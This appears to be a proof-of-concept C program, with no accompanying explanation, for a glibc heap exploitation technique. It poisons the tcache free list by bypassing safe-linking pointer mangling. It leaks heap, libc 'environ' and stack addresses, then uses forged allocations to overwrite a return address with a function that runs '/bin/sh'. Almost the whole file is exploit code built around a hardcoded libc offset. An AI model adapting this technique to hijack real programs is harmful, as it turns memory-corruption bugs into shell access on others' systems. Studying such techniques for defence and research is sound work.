#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* _environ=system_ptr+0x1edfc0;
  printf("environ %p\n",_environ);
  char* leak_chunk=(*(unsigned long long *)chunk1)<<12;
  printf("chunk ptr %p\n",leak_chunk);
  *(unsigned long long *)chunk2=((unsigned long long )leak_chunk>>12)^(unsigned long long)(_environ);
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  unsigned long long stack=*(unsigned long long *)chunk1;
  printf("chunk1[0] leak stack %p \n",stack);

  unsigned long long retaddr=stack-0x120;
  chunk1=malloc(0x110);
  chunk2=malloc(0x110);
  free(chunk1);
  free(chunk2);
  leak_chunk=(*(unsigned long long *)chunk1)<<12;
  printf("chunk ptr %p\n",leak_chunk);
  *(unsigned long long *)chunk2=((unsigned long long )leak_chunk>>12)^(unsigned long long)(retaddr-8);
  chunk2=malloc(0x110);
  chunk1=malloc(0x110);
  *(unsigned long long *)(chunk1+8)=getshell; //rop
  return 0;
}